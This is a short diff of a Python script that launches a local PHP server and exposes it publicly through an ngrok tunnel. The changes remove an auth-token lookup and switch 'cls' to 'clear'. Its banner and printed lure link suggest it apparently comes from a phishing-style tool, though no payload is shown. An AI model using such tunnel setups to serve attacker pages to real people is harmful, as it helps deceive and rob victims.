@@ -556,10 +556,7 @@ exit();""")
       print("")
       bannner.banner()
       print(Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+" Php Server Has Started on Port 6060")
-      with open("config.json", "r") as read_file:
-        data = json.load(read_file)
-        token = data["your_token"]
-      link = ngrok.connect(6060,"http",auth_token=token)
+      link = ngrok.connect(6060,"http")
       a_print_link = (Fore.RED+" ["+Fore.WHITE+"$"+Fore.RED+"]"+Fore.RED+" url1 : "+link)
       b_print_link = (a_print_link).replace("http","https")
       print("\n"+b_print_link)
@@ -627,7 +624,7 @@ exit();""")
   except:
     with open("exit","w") as kill:
       Popen(("taskkill","/F","/IM","php*"),stderr=kill,stdout=kill)
-      os.system("cls")
+      os.system("clear")
       sys.exit()
 
 
@@ -1070,5 +1067,5 @@ exit();
   except:
     with open("exit","w") as kill:
       Popen(("taskkill","/F","/IM","php*"),stderr=kill,stdout=kill)
-      os.system("cls")
+      os.system("clear")
       sys.exit()
